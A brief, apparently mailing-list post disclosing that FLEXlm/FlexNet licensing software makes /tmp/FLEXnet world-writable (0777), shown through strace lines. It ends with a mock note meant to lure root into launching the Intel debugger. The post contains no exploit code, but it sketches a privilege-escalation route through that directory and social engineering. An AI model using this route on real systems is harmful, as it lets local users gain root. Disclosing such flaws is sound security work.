Here's an example strace:

mkdir("/tmp/FLEXnet", 0777) = -1 EEXIST (File exists)
chmod("/tmp/FLEXnet", 0777) = ...

I don't have the time to track down the full extent of it, but neither
do I think it should be neglected.

Possibly affects other stuff using this FLEXlm/FlexNet DRM solution.

Save yourselves! Hopefullly, you know who you are.

    Dear root,
    I think there’s a bug in the Intel debugger. Could you please check
    to see what version we have installed. It should print it on startup.
    K thx bye
